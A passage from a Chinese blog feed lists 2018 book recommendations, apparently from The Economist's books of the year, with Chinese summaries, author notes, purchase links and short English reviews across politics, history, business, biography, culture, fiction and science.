<p>​​亚当·温克勒（Adam Winkler），加州大学洛杉矶分校宪法教授。<br>温克勒是奥斯卡获奖电影制片人欧文·温克勒的最小儿子。小时候，他在电影中扮演过小角色。</p>
<p>其它作品：《Gunfight: The Battle over the Right to Bear Arms in America》</p>
<h4 id="AI-Superpowers-China-Silicon-Valley-and-the-New-World-Order"><a href="#AI-Superpowers-China-Silicon-Valley-and-the-New-World-Order" class="headerlink" title="AI Superpowers: China, Silicon Valley and the New World Order"></a>AI Superpowers: China, Silicon Valley and the New World Order</h4><ul>
<li>作者：李开复（Kai-Fu Lee）</li>
<li>售价：Houghton Mifflin Harcourt; 272 pages; $28 | RMB 99 ebook</li>
<li>链接：<a href="https://www.amazon.co.uk/AI-Superpowers-China-Silicon-Valley/dp/132854639X" target="_blank" rel="noopener">https://www.amazon.co.uk/AI-Superpowers-China-Silicon-Valley/dp/132854639X</a></li>
<li>内容概要</li>
</ul>
<p>李开复，现任创新工场的董事长兼首席执行官。IT 业界知名经理人和计算机科学家。曾在苹果、SGI、微软和 Google 等多家 IT 公司担当要职。<br>李开复在本书中预言中国将主宰人工智能。他认为中国将粉碎硅谷，因为它拥有更多的数据，蔑视隐私，并且更加无情地竞争。<br>李开复说，“如果数据是新的石油，那么中国就是新的沙特阿拉伯。”</p>
<ul>
<li>相关作品</li>
</ul>
<p>美国参议员马克·华纳（Mark Warner，参议院民主党党团副主席，曾任维吉尼亚州州长）将《AI Superpowers》一书列入他的2018年推荐阅读书单<a href="https://www.politico.com/interactives/2018/politico-50-book-picks/" target="_blank" rel="noopener">The 2018 POLITICO 50 Reading List</a>。</p>
<h2 id="科学技术类"><a href="#科学技术类" class="headerlink" title="科学技术类"></a>科学技术类</h2><h4 id="Beyond-Weird"><a href="#Beyond-Weird" class="headerlink" title="Beyond Weird"></a>Beyond Weird</h4><ul>
<li>作者：Philip Ball</li>
<li>售价：University of Chicago Press; 384 pages; $26. Bodley Head; £17.99</li>
<li>链接：<a href="https://www.amazon.com/Beyond-Weird-Philip-Ball-ebook/dp/B0732LTBQT" target="_blank" rel="noopener">https://www.amazon.com/Beyond-Weird-Philip-Ball-ebook/dp/B0732LTBQT</a></li>
<li>内容概要</li>
</ul>
<p>大多数关于量子力学的书都强调它的古怪，大众通常也觉得非常令人困惑、难以理解。<br>本书作者尝试以轻松简单的方式入手，简单而深思熟虑地解释主题，揭示了理论的真正力量。</p>
<ul>
<li>相关作品</li>
</ul>
<p><a href="https://en.wikipedia.org/wiki/Philip_Ball" target="_blank" rel="noopener">菲利普·鲍尔（Philip Ball）</a> 英国科学作家。 二十多年来，他一直是《自然》杂志编辑及《观点》杂志(Prospect)、《化学世界》（Chemistry World）、《自然材料》（Nature Materials ）和 《BBC Future》的专栏作家。</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Critical_Mass_(book" target="_blank" rel="noopener">《Critical Mass: How One Thing Leads to Another》</a>) 2005 Royal Society Winton Prize for Science Books</li>
<li><a href="#">《Serving the Reich: The Struggle for the Soul of Physics under Hitler》</a> 2014</li>
</ul>
<h4 id="Rocket-Men"><a href="#Rocket-Men" class="headerlink" title="Rocket Men"></a>Rocket Men</h4><ul>
<li>作者：Robert Kurson</li>
<li>售价：Random House; 384 pages; $28. Scribe; £18.99 | ￥204</li>
<li>链接：<br><a href="https://item.jd.com/1343455498.html" target="_blank" rel="noopener">https://item.jd.com/1343455498.html</a><br><a href="https://www.amazon.com/Rocket-Men-Odyssey-Astronauts-Journey/dp/0812988701" target="_blank" rel="noopener">https://www.amazon.com/Rocket-Men-Odyssey-Astronauts-Journey/dp/0812988701</a></li>
<li>内容概要</li>
</ul>
<p>详细讲述阿波罗8号航天任务，人类历史上第一次绕月载人航天飞行。</p>
<p>美国国家航空航天局（NASA）针对阿波罗8号的准备工作只花了四个月时间。计划中采用的硬件只被使用过几次：土星5号火箭此前只发射过两次，而阿波罗航天器也只执行过一次载人任务（阿波罗7号）。通过与宇航员，他们的亲人，宇航局人员和无数专家数百小时的一对一采访，以及充满生动和令人难忘的细节，揭示了所涉及的史诗般的危险，以及人类第一次离开地球并进入一个新世界所带来的独特勇气。</p>
<ul>
<li>相关作品</li>
</ul>
<p>罗伯特·库森（Robert A. Kurson)，美国作家。毕业于哈佛法学院，职业写作生涯始于芝加哥太阳时报。</p>
<ul>
<li>2004 年畅销书《Shadow Divers》。讲述两位美国潜水员探索第二次世界大战时期德国U型潜艇沉船的故事。</li>
</ul>
<h4 id="Nine-Pints-A-Journey-Through-the-Money-Medicine-and-Mysteries-of-Blood"><a href="#Nine-Pints-A-Journey-Through-the-Money-Medicine-and-Mysteries-of-Blood" class="headerlink" title="Nine Pints: A Journey Through the Money, Medicine and Mysteries of Blood"></a>Nine Pints: A Journey Through the Money, Medicine and Mysteries of Blood</h4><ul>
<li>作者：Rose George</li>
<li>售价：Metropolitan Books; 368 pages; $30. Portobello Books; £14.99</li>
<li>链接：<a href="https://www.amazon.com/Nine-Pints-Journey-Medicine-Mysteries/dp/1627796371" target="_blank" rel="noopener">https://www.amazon.com/Nine-Pints-Journey-Medicine-Mysteries/dp/1627796371</a></li>
<li>内容概要</li>
</ul>
<p>《Nine Pints》跨越科学，政治，故事和全球流行病，以全新的眼光揭示我们生命的血液。</p>
<p>作者将我们从古老的放血实践带到了“液体活检”的突破，这有望通过简单的验血来诊断癌症和其他疾病。介绍了Janet Vaughan，他在Blitz期间建立了世界上第一个大规模献血系统，以及Arunachalam Muruganantham，因其在发展中国家的卫生巾方面的工作而被称为“月经人”。探讨了等离子体输血的利润丰厚的业务，其中美国被称为“血浆的欧佩克”。作者展望未来，研究人员试图将合成血液带到您附近的医院。</p>
<ul>
<li>相关作品</li>
</ul>
<p>罗斯·乔治（Rose George），英国记者和作家。毕业于牛津大学、宾夕法尼亚大学，能说流利的法语和意大利语。曾作为科索沃“康德纳斯旅行者”杂志的战地记者，两次在萨达姆 侯赛因的生日聚会上做客。</p>
<ul>
<li>A Life Removed (Penguin Books, 2004) ISBN 978-0141019055 | 探讨了利比里亚境内难民和流离失所者的日常</li>
<li>The Big Necessity (Metropolitan/Portobello, 2008) ISBN 9780805090833 | 世界上最被忽视的公共卫生问题危机，体面厕所的基本必要性</li>
<li>Ninety Percent of Everything (Metropolitan Books New York, 2013) ISBN 9780805092639</li>
<li>Deep Sea and Foreign Going (Portobello London 2013) ISBN 9781846272998</li>
<li>Nine Pints: a Journey Through the Money, Medicine, and Mysteries of Blood (Metropolitan Books, 2018) ISBN 9781627796378</li>
</ul>
<h2 id="书单明细"><a href="#书单明细" class="headerlink" title="书单明细"></a>书单明细</h2><h2 id="Politics-and-current-affairs"><a href="#Politics-and-current-affairs" class="headerlink" title="Politics and current affairs"></a>Politics and current affairs</h2><h4 id="Moneyland"><a href="#Moneyland" class="headerlink" title="Moneyland"></a>Moneyland</h4><ul>
<li>作者：Oliver Bullough</li>
<li>售价：298 pages; $35 | St Martin’s Press in May; $28.99</li>
<li>链接：<a href="https://www.amazon.cn/dp/125020870X" target="_blank" rel="noopener">https://www.amazon.cn/dp/125020870X</a></li>
<li>内容概要</li>
<li>相关作品</li>
</ul>
<p>Moneyland is the author’s term for the virtual country into which the world’s mega-rich smuggle their (sometimes ill-gotten) wealth, so insulating it from the attention of tax and other officials. Focused in part on the kleptocrats of the former Soviet Union, the book ranges across the world and a wide cast of lawyers, accountants and mountebanks who see to it that money stolen in poor, ill-run countries can be invested in rich, safe ones. An urgent exposé of a vital subject.</p>
<h4 id="Enlightenment-Now-The-Case-for-Reason-Science-Humanism-and-Progress"><a href="#Enlightenment-Now-The-Case-for-Reason-Science-Humanism-and-Progress" class="headerlink" title="Enlightenment Now: The Case for Reason, Science, Humanism and Progress"></a>Enlightenment Now: The Case for Reason, Science, Humanism and Progress</h4><ul>
<li>作者：Steven Pinker</li>
<li>售价：576 pages; $35 |Allen Lane; £25</li>
<li>链接：</li>
<li>内容概要</li>
<li>相关作品</li>
</ul>
<p>His critics regard him as Panglossian, and suspect he cherry-picks statistics, but the author’s case for global optimism is entertaining and well-argued. The Enlightenment virtues of reason and education, allied to trade and technology, have made the world richer, safer and even happier, he contends, and the improvements are likely to continue. Populists and demagogues are merely a blip in this consoling counterpoint to the misery of the news.</p>
<h4 id="Fascism-A-Warning"><a href="#Fascism-A-Warning" class="headerlink" title="Fascism: A Warning"></a>Fascism: A Warning</h4><ul>
<li>作者：Madeleine Albright</li>
<li>售价：254 pages; Harper Collins; $27.99 and £16.99</li>
<li>链接：</li>
<li>内容概要</li>
<li>相关作品</li>
</ul>
<p>The former secretary of state—and a longtime professor of international relations at Georgetown University—fled both Nazism and communism as a child. She does not deploy the term “fascism” loosely and deplores those who do; instead she cooly analyses the way countries can descend into tyranny. In uncertain times, she observes, many people no longer want to be asked what they think: “We want to be told where to march.”</p>
<h4 id="First-Raise-a-Flag-How-South-Sudan-Won-the-Longest-War-but-Lost-the-Peace"><a href="#First-Raise-a-Flag-How-South-Sudan-Won-the-Longest-War-but-Lost-the-Peace" class="headerlink" title="First Raise a Flag: How South Sudan Won the Longest War but Lost the Peace"></a>First Raise a Flag: How South Sudan Won the Longest War but Lost the Peace</h4><ul>
<li>作者：Peter Martell</li>
<li>售价：Hurst; 320 pages; £25</li>
<li>链接：</li>
<li>内容概要</li>
<li>相关作品</li>
</ul>
<p>A correspondent based in Juba, capital of the new, troubled country of South Sudan, explains its tragic predicament. A history of slave raids, imperialism and brutal rule by Khartoum leads to independence and civil war. The saga is enlivened by interviews with retired spooks and elderly veterans of the colonial administration.</p>
<h4 id="Into-the-Hands-of-the-Soldiers-Freedom-and-Chaos-in-Egypt-and-the-Middle-East"><a href="#Into-the-Hands-of-the-Soldiers-Freedom-and-Chaos-in-Egypt-and-the-Middle-East" class="headerlink" title="Into the Hands of the Soldiers: Freedom and Chaos in Egypt and the Middle East"></a>Into the Hands of the Soldiers: Freedom and Chaos in Egypt and the Middle East</h4><ul>
<li>作者：David Kirkpatrick</li>
<li>售价：384 pages; $28. Bloomsbury Publishing; £25</li>
<li>链接：</li>
<li>内容概要</li>
<li>相关作品</li>
</ul>
<p>In this pellucid chronicle of Egypt’s trajectory since the toppling of Hosni Mubarak in 2011, the former Cairo bureau chief of the New York Times is almost as scathing about the bungling foreign policy of successive American administrations as he is about Abdel-Fattah al-Sisi, Egypt’s strongman president. The country’s so-called stability, he suggests, is again breeding misery and extremism.</p>
<h4 id="Shadows-of-Empire-1"><a href="#Shadows-of-Empire-1" class="headerlink" title="Shadows of Empire"></a>Shadows of Empire</h4><ul>
<li>作者：Michael Kenny and Nick Pearce</li>
<li>售价：200 pages; $19.95 and £14.99</li>
<li>链接：</li>
<li>内容概要</li>
<li>相关作品</li>
</ul>
<p>The “Anglosphere” is not a term in common parlance. This timely and enlightening book shows that, throughout the 20th century, the idea of a fraternity of English-speaking nations exerted a powerful influence on British politicians, including Churchill and Thatcher. It has resurfaced in Brexiteers’ dreams of invigorated Commonwealth trade.</p>
<h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><h4 id="A-History-of-America-in-100-Maps-1"><a href="#A-History-of-America-in-100-Maps-1" class="headerlink" title="A History of America in 100 Maps"></a>A History of America in 100 Maps</h4><ul>
<li>作者：Susan Schulten</li>
<li>售价：University of Chicago Press; 256 pages; $35. British Library; £30</li>
<li>链接：</li>
<li>内容概要</li>
<li>相关作品</li>
</ul>
<p>A collection of maps, by turns beautiful and eccentric, which charts the making of America. It shows the role of maps in exploration and conquest and proves that, while some aspects of American political geography are enduring, much in the country’s make-up has, like the banks of the Mississippi, always been in flux.</p>
<h4 id="Pogrom-Kishinev-and-the-Tilt-of-History"><a href="#Pogrom-Kishinev-and-the-Tilt-of-History" class="headerlink" title="Pogrom: Kishinev and the Tilt of History"></a>Pogrom: Kishinev and the Tilt of History</h4><ul>
<li>作者：Steven Zipperstein</li>
<li>售价：Liveright; 288 pages; $27.95 and £20</li>
<li>链接：</li>
<li>内容概要</li>
</ul>
<p>1903 年基什尼奥夫犹太人屠杀。</p>
<ul>
<li>相关作品</li>
</ul>
<p>The pogrom in Kishinev in 1903 became a byword for anti-Semitic violence for Jews everywhere, its victims blamed variously for their passivity and for having resisted their attackers. The event roused Zionists and Jew-haters alike, and was instrumental in both the publication of the “Protocols of the Elders of Zion” and the establishment (in New York) of the naacp. A gripping, scrupulous history of a seminal but mythologised atrocity.</p>
<h4 id="The-China-Mission-George-Marshall’s-Unfinished-War-1945-1947-1"><a href="#The-China-Mission-George-Marshall’s-Unfinished-War-1945-1947-1" class="headerlink" title="The China Mission: George Marshall’s Unfinished War, 1945-1947"></a>The China Mission: George Marshall’s Unfinished War, 1945-1947</h4><ul>
<li>作者：Daniel Kurtz-Phelan</li>
<li>售价：W.W. Norton &amp; Company; 496 pages; $28.95</li>
<li>链接：</li>
<li><p>内容概要</p>
</li>
<li><p>相关作品</p>
</li>
</ul>
<p>Marshall’s mission to China is much less well-known than his effort to rebuild Europe after the second world war. The former, unlike the latter, failed; China descended into civil war and then a communist dictatorship. This account of the debacle by a former diplomat is both a compelling portrait of a remarkable soldier and statesman and an instructive lesson in the limits of American power, even at its zenith.</p>
<h4 id="Rise-and-Kill-First-The-Secret-History-of-Israel’s-Targeted-Assassinations"><a href="#Rise-and-Kill-First-The-Secret-History-of-Israel’s-Targeted-Assassinations" class="headerlink" title="Rise and Kill First: The Secret History of Israel’s Targeted Assassinations"></a>Rise and Kill First: The Secret History of Israel’s Targeted Assassinations</h4><p>By Ronen Bergman. Random House; 784 pages; $35. John Murray; £19.99</p>
<p>For this impressive work of reportage, the author not only spoke to hundreds of Israeli spies but also convinced them to hand over a trove of documents. Then he constructed a thrilling narrative of extreme bravery and compromised morality.</p>
<h2 id="Business-and-economics"><a href="#Business-and-economics" class="headerlink" title="Business and economics"></a>Business and economics</h2><h4 id="We-the-Corporations-How-American-Businesses-Won-Their-Civil-Rights-1"><a href="#We-the-Corporations-How-American-Businesses-Won-Their-Civil-Rights-1" class="headerlink" title="We the Corporations: How American Businesses Won Their Civil Rights"></a>We the Corporations: How American Businesses Won Their Civil Rights</h4><ul>
<li>作者：Adam Winkler</li>
<li>售价：Liveright; 496 pages; $28.95</li>
<li>链接：</li>
<li><p>内容概要</p>
</li>
<li><p>相关作品</p>
</li>
</ul>
<p>“For most of American history”, the author comments, “the Supreme Court failed to protect the dispossessed and the marginalised, with the justices claiming to be powerless in the face of hostile public sentiment.” Meanwhile “the court has insisted that broad public sentiment favouring business regulation must bend to the demands of the constitution.” A lively survey of a neglected but important feature of American history.</p>
<h4 id="AI-Superpowers-China-Silicon-Valley-and-the-New-World-Order-1"><a href="#AI-Superpowers-China-Silicon-Valley-and-the-New-World-Order-1" class="headerlink" title="AI Superpowers: China, Silicon Valley and the New World Order"></a>AI Superpowers: China, Silicon Valley and the New World Order</h4><ul>
<li>作者：Kai-Fu Lee</li>
<li>售价：Houghton Mifflin Harcourt; 272 pages; $28</li>
<li>链接：</li>
<li><p>内容概要</p>
</li>
<li><p>相关作品</p>
</li>
</ul>
<p>A former manager at assorted American tech giants—and now the boss of a Chinese venture-capitalist fund—anticipates the coming contest to dominate artificial intelligence. He thinks China will crush Silicon Valley because it has more data, disdains privacy and competes more ruthlessly. Thought-provoking, if not altogether convincing.</p>
<h4 id="Radical-Markets-Uprooting-Capitalism-and-Democracy-for-a-Just-Society"><a href="#Radical-Markets-Uprooting-Capitalism-and-Democracy-for-a-Just-Society" class="headerlink" title="Radical Markets: Uprooting Capitalism and Democracy for a Just Society"></a>Radical Markets: Uprooting Capitalism and Democracy for a Just Society</h4><ul>
<li>作者：Eric Posner and E. Glen Weyl</li>
<li>售价：Princeton University Press; 368 pages; $29.95 and £24.95</li>
<li>链接：</li>
<li><p>内容概要</p>
</li>
<li><p>相关作品</p>
</li>
</ul>
<p>A law professor and an economist argue that the way out of liberalism’s impasse is to expand the role of markets, not to subdue them. Some of their ideas—on property rights, elections, immigration and much besides—are impractical, and others eccentric; but together they point to a possible response to the challenges of populism and protectionism.</p>
<h4 id="EuroTragedy-A-Drama-in-Nine-Acts"><a href="#EuroTragedy-A-Drama-in-Nine-Acts" class="headerlink" title="EuroTragedy: A Drama in Nine Acts"></a>EuroTragedy: A Drama in Nine Acts</h4><p>By Ashoka Mody. Oxford University Press; 672 pages; $34.95 and £25.49</p>
<p>A comprehensive and authoritative history of the euro which argues that the project was a predictable error. Written by a former senior official at the imf, the book laments the intellectual failures present at the foundation of the single-currency area and in the mishandled response to the sovereign-debt crisis after 2010.</p>
<h4 id="Crashed-How-a-Decade-of-Financial-Crises-Changed-the-World"><a href="#Crashed-How-a-Decade-of-Financial-Crises-Changed-the-World" class="headerlink" title="Crashed: How a Decade of Financial Crises Changed the World"></a>Crashed: How a Decade of Financial Crises Changed the World</h4><p>By Adam Tooze. Viking; 720 pages; $35. Allen Lane; £30</p>
<p>This panoramic survey of the aftermath of the financial crash of 2008 has four main themes: the immediate response, in which the banks were rescued; the euro-zone crisis; the shift in the developed world after 2010 to more austere fiscal policies; and the rise of populist politics in Europe and America in the wake of the debacle. The author has little faith in the ability of governments to take decisive action when the next crisis hits.</p>
<h2 id="Biography-and-memoir"><a href="#Biography-and-memoir" class="headerlink" title="Biography and memoir"></a>Biography and memoir</h2><h4 id="The-Wife’s-Tale-A-Personal-History"><a href="#The-Wife’s-Tale-A-Personal-History" class="headerlink" title="The Wife’s Tale: A Personal History"></a>The Wife’s Tale: A Personal History</h4><p>By Aida Edemariam. Harper; 314 pages; $26.99. Fourth Estate; £16.99</p>
<p>The author’s Ethiopian grandmother, Yetemegnu, was married at the age of eight to a religious student more than 20 years her senior. By 14 she was a mother. She fled her husband’s mistreatment, yet when he was arrested she petitioned the emperor on his behalf; on his death she mourned “my husband, who raised me”. The family sought sanctuary in the mountains when the Italians invaded in 1935. This intimate memoir is also an oblique chronicle of Ethiopia’s turbulent history.</p>
<h4 id="Educated"><a href="#Educated" class="headerlink" title="Educated"></a>Educated</h4><p>By Tara Westover. Random House; 385 pages; $28. Hutchinson; £14.99</p>
<p>A riveting memoir of a brutal upbringing. The author grew up in a normally opaque environment: a Mormon survivalist household in Idaho, where she endured abuse and received no education. Despite not setting foot in a classroom until she was 17, she made it to university and wound up with a  phd from Cambridge.</p>
<h4 id="Barracoon"><a href="#Barracoon" class="headerlink" title="Barracoon"></a>Barracoon</h4><p>By Zora Neale Hurston. Amistad; 208 pages; $24.99. HQ; £12.99</p>
<p>Zora Neale Hurston’s study of Kossula, later called Cudjo Lewis, one of the last Africans to be kidnapped into slavery in America, has never been commercially published before. Interviewed at his home in Alabama in 1927-28, he vividly recalled his capture and illegal transportation on the eve of America’s civil war: “I think maybe I die in my sleep when I dream about my mama.” A devastating book.</p>
<h4 id="Napoleon-A-Life"><a href="#Napoleon-A-Life" class="headerlink" title="Napoleon: A Life"></a>Napoleon: A Life</h4><p>By Adam Zamoyski. Basic Books; 784 pages; $40. William Collins; £30</p>
<p>Some of his critics portray him as a monster; enthusiasts have characterised him as a demi-god. In this superlative account, Napoleon is a mortal, with great virtues and equally great flaws, at once dazzling and gauche. “From the sublime to the ridiculous”, Napoleon himself said after his disastrous campaign in Russia, “there is but one step.”</p>
<h4 id="Churchill-Walking-with-Destiny"><a href="#Churchill-Walking-with-Destiny" class="headerlink" title="Churchill: Walking with Destiny"></a>Churchill: Walking with Destiny</h4><p>By Andrew Roberts. Viking; 1,152 pages; $30. Allen Lane; £35</p>
<p>Of the many biographies of Winston Churchill, this is the fullest. Acknowledging its subject’s flaws and sometimes catastrophic mistakes, it nevertheless makes a compelling case for his greatness, both as a statesman and a writer. More unusually, by evoking his wit, generosity and courage, it also succeeds in making him lovable. “I was not the lion,” Churchill said, “but it fell to me to give the lion’s roar.”</p>
<h4 id="Gandhi-The-Years-That-Changed-the-World-1914-1948"><a href="#Gandhi-The-Years-That-Changed-the-World-1914-1948" class="headerlink" title="Gandhi: The Years That Changed the World 1914-1948"></a>Gandhi: The Years That Changed the World 1914-1948</h4><p>By Ramachandra Guha. Knopf; 1,104 pages; $40. Allen Lane; £40</p>
<p>At a time of rising Hindu nationalism, the Mahatma’s values and example are as relevant as ever in his homeland. This second volume of a magisterial biography begins in 1914, when Gandhi returned to India from South Africa. It conveys his charisma, his intellect and the evolution of his political beliefs, including his advocacy of Hindu-Muslim reconciliation.</p>
<h4 id="The-Spy-and-the-Traitor-The-Greatest-Espionage-Story-of-the-Cold-War"><a href="#The-Spy-and-the-Traitor-The-Greatest-Espionage-Story-of-the-Cold-War" class="headerlink" title="The Spy and the Traitor: The Greatest Espionage Story of the Cold War"></a>The Spy and the Traitor: The Greatest Espionage Story of the Cold War</h4><p>By Ben Macintyre. Crown; 368 pages; $28. Viking; £25</p>
<p>Oleg Gordievsky, a vital Western asset inside the kgb, was smuggled across the Soviet Union’s border with Finland in the boot of a car. The story of Mr Gordievsky’s life, and that of Aldrich Ames, the renegade cia officer who outed him, is told with the gusto of a thriller. A fitting tribute to a brave but lonely man.</p>
<h2 id="Culture"><a href="#Culture" class="headerlink" title="Culture"></a>Culture</h2><h4 id="The-Personality-Brokers"><a href="#The-Personality-Brokers" class="headerlink" title="The Personality Brokers"></a>The Personality Brokers</h4><p>By Merve Emre. Doubleday; 336 pages; $27.95. Published in Britain by William Collins as “What’s Your Type?”; £20</p>
<p>The Myers-Briggs Type Indicator, the best-known personality test, is the focus of an entertaining cultural history of the personality-assessment industry. It was invented by a mother-and-daughter team, under the influence of Carl Jung. Its enduring popularity ought not to be surprising: after all, it offers both the “rush of self-discovery” and “the comfort of solidarity” with others of the same type.</p>
<h4 id="The-Prodigal-Tongue"><a href="#The-Prodigal-Tongue" class="headerlink" title="The Prodigal Tongue"></a>The Prodigal Tongue</h4><p>By Lynne Murphy. Penguin Books; 368 pages; $17. Oneworld; £16.99</p>
<p>The first and perhaps only book on the relative merits of American and British English that is dominated by facts and analysis rather than nationalistic prejudice. For all its scholarship, this is also a funny and rollicking read.</p>
<h4 id="Space-Odyssey-Stanley-Kubrick-Arthur-C-Clarke-and-the-Making-of-a-Masterpiece"><a href="#Space-Odyssey-Stanley-Kubrick-Arthur-C-Clarke-and-the-Making-of-a-Masterpiece" class="headerlink" title="Space Odyssey: Stanley Kubrick, Arthur C. Clarke and the Making of a Masterpiece"></a>Space Odyssey: Stanley Kubrick, Arthur C. Clarke and the Making of a Masterpiece</h4><p>By Michael Benson. Simon &amp; Schuster; 512 pages; $30 and £25</p>
<p>An illuminating account of a collaboration that resulted in a landmark film. The author’s scientific background helps him to explain its pathbreaking visual effects. The making of a great work of art has rarely been anatomised so thoroughly.</p>
<h4 id="Astounding-John-W-Campbell-Isaac-Asimov-Robert-A-Heinlein-L-Ron-Hubbard-and-the-Golden-Age-of-Science-Fiction"><a href="#Astounding-John-W-Campbell-Isaac-Asimov-Robert-A-Heinlein-L-Ron-Hubbard-and-the-Golden-Age-of-Science-Fiction" class="headerlink" title="Astounding: John W. Campbell, Isaac Asimov, Robert A. Heinlein, L. Ron Hubbard and the Golden Age of Science Fiction"></a>Astounding: John W. Campbell, Isaac Asimov, Robert A. Heinlein, L. Ron Hubbard and the Golden Age of Science Fiction</h4><p>By Alec Nevala-Lee. Dey Street Books; 544 pages; $28.99. To be released in Britain in August; £10.99</p>
<p>An indispensable book for anyone trying to understand the birth and meaning of modern science fiction in America from the 1930s to the 1950s—a genre that reshaped how people think about the future, for good and ill.</p>
<h4 id="Boom-Town"><a href="#Boom-Town" class="headerlink" title="Boom Town"></a>Boom Town</h4><p>By Sam Anderson. Crown; 448 pages; $28</p>
<p>The fortunes of the Thunder, Oklahoma City’s basketball team, become a metaphor for the city’s own history in a hymn to an unsung metropolis. In this colourful compendium of heroism, skulduggery, land-grabs, oil and violence, its subject emerges as equal parts Wild West and Oz.</p>
<h4 id="Fryderyk-Chopin-A-Life-and-Times"><a href="#Fryderyk-Chopin-A-Life-and-Times" class="headerlink" title="Fryderyk Chopin: A Life and Times"></a>Fryderyk Chopin: A Life and Times</h4><p>By Alan Walker. Farrar, Straus and Giroux; 768 pages; $40. Faber &amp; Faber; £30</p>
<p>Chopin’s romantic life—he was a child prodigy who ran off with George Sand before dying at 39—has had many chroniclers. This definitive account draws on new sources to shed light on his career and volatile times. The man behind the myth emerges as an amiable perfectionist.</p>
<h2 id="Fiction"><a href="#Fiction" class="headerlink" title="Fiction"></a>Fiction</h2><h4 id="The-Long-Take"><a href="#The-Long-Take" class="headerlink" title="The Long Take"></a>The Long Take</h4><p>By Robin Robertson. Knopf; 256 pages; $27. Picador; £14.99</p>
<p>The wondrous story of a Canadian veteran of the second world war who washes up in New York and then Los Angeles—told mostly in verse. Walker, the protagonist, is haunted by his experiences in combat and by memories of his youth, and pained by the neglect of the homeless in California. Probably the best novel of the year.</p>
<h4 id="The-Silence-of-the-Girls"><a href="#The-Silence-of-the-Girls" class="headerlink" title="The Silence of the Girls"></a>The Silence of the Girls</h4><p>By Pat Barker. Doubleday; 304 pages; $27.95. Hamish Hamilton; £18.99</p>
<p>The “Iliad” reimagined from the perspective of Briseis, the captured slave-girl who is the cause of the quarrel between Achilles and Agamemnon that animates Homer’s epic—and in the original is almost silent. The technicolour horrors of war are accompanied by similes of almost Homeric brilliance.</p>
<h4 id="Washington-Black"><a href="#Washington-Black" class="headerlink" title="Washington Black"></a>Washington Black</h4><p>By Esi Edugyan. Knopf; 352 pages; $26.95. Serpent’s Tail; £14.99</p>
<p>The title character of this poignant saga is born into slavery on a sugar plantation in Barbados; he escapes in the company of an eccentric inventor, a slave-catcher on his trail, before wandering across several continents. An original and compulsive exploration of a tragic subject.</p>
<h4 id="Milkman"><a href="#Milkman" class="headerlink" title="Milkman"></a>Milkman</h4><p>By Anna Burns. Graywolf Press; 360 pages; $16. Faber &amp; Faber; £8.99</p>
<p>The winner of this year’s Man Booker prize is set during the Troubles in Northern Ireland in an unnamed city that looks like Belfast. “Middle sister”, the protagonist (nobody in the book has a conventional name), is stalked by a paramilitary. A haunting depiction of the impact of violence on ordinary lives.</p>
<h4 id="Love-is-Blind"><a href="#Love-is-Blind" class="headerlink" title="Love is Blind"></a>Love is Blind</h4><p>By William Boyd. Knopf; 384 pages; $26.95. Viking; £18.99</p>
<p>The tale of a Scottish piano-tuner infatuated with a Russian opera singer gallops across fin-de-siècle Europe, from Paris to St Petersburg to Trieste, then onwards to the Andaman Islands. A treat for the author’s many fans and a masterclass in old-fashioned storytelling.</p>
<h4 id="Normal-People"><a href="#Normal-People" class="headerlink" title="Normal People"></a>Normal People</h4><p>By Sally Rooney. Faber &amp; Faber; 266 pages; £14.99. To be published in America by Hogarth in April; $26</p>
<p>A beautiful portrait of an on-off relationship between two Irish youngsters, at school and university. The scrutiny of their self-deceptions is at once unforgiving and tender. The tango of power is masterfully conveyed in their dialogue.</p>
<h4 id="Fire-Sermon"><a href="#Fire-Sermon" class="headerlink" title="Fire Sermon"></a>Fire Sermon</h4><p>By Jamie Quatro. Grove Press; 224 pages; $24. Picador; £14.99</p>
<p>A lyrical, experimental novel about faith and adultery, divine and erotic love, worship and transgression, from an accomplished writer of short stories.</p>
<h2 id="Science-and-Technology"><a href="#Science-and-Technology" class="headerlink" title="Science and Technology"></a>Science and Technology</h2><h4 id="Beyond-Weird-1"><a href="#Beyond-Weird-1" class="headerlink" title="Beyond Weird"></a>Beyond Weird</h4><p>By Philip Ball. University of Chicago Press; 384 pages; $26. Bodley Head; £17.99</p>
<p>Most books on quantum mechanics emphasise its weirdness, a built-in excuse for being baffling. Wearing deep learning lightly, this author explains his subject simply and thoughtfully, revealing the theory’s true power as a way of knowing what can be said about nature.</p>
<h4 id="Rocket-Men-1"><a href="#Rocket-Men-1" class="headerlink" title="Rocket Men"></a>Rocket Men</h4><p>By Robert Kurson. Random House; 384 pages; $28. Scribe; £18.99</p>
<p>A gripping account of Apollo 8, the first manned space flight around the Moon. The story of the dangerous mission that laid the ground for the Moon landing has not been told in such detail until now.</p>
<h4 id="Nine-Pints-A-Journey-Through-the-Money-Medicine-and-Mysteries-of-Blood-1"><a href="#Nine-Pints-A-Journey-Through-the-Money-Medicine-and-Mysteries-of-Blood-1" class="headerlink" title="Nine Pints: A Journey Through the Money, Medicine and Mysteries of Blood"></a>Nine Pints: A Journey Through the Money, Medicine and Mysteries of Blood</h4><p>By Rose George. Metropolitan Books; 368 pages; $30. Portobello Books; £14.99</p>
<p>This history of blood takes its name from the quantity in a human body. The author visits high-tech facilities, a South African slum and Nepalese villages to convey, scintillatingly, what is known and what remains mysterious about the liquid.</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.ft.com/content/2893ce0c-5903-11e8-b8b2-d6ceb45fa9d0" target="_blank" rel="noopener">FT | Shadows of Empire,A fascinating account of the influence the ‘Anglosphere’ has had on British politics</a></li>
<li><a href="https://cn.nytimes.com/culture/20180607/daniel-kurtz-phelan-china-mission/zh-hant/dual/" target="_blank" rel="noopener">纽约时报|《中國任務》：馬歇爾未能阻止的國共殊死之爭</a></li>
<li><a href="https://weibo.com/ttarticle/p/show?id=2309404241347656727811&amp;infeed=1" target="_blank" rel="noopener">法人是怎样一步步获得公民权的？ | 书评 </a></li>
<li><a href="https://www.state.gov/s/p/" target="_blank" rel="noopener">Policy Planning Staff</a></li>
<li><a href="https://t.qianzhan.com/caijing/detail/180802-91b4be44.html" target="_blank" rel="noopener">现实世界是真实存在的吗？还是这一切都只是我们的想象？</a></li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title>工程组织理论与实践</title>
    <url>/2019/05/03/Engineering-Organization/</url>
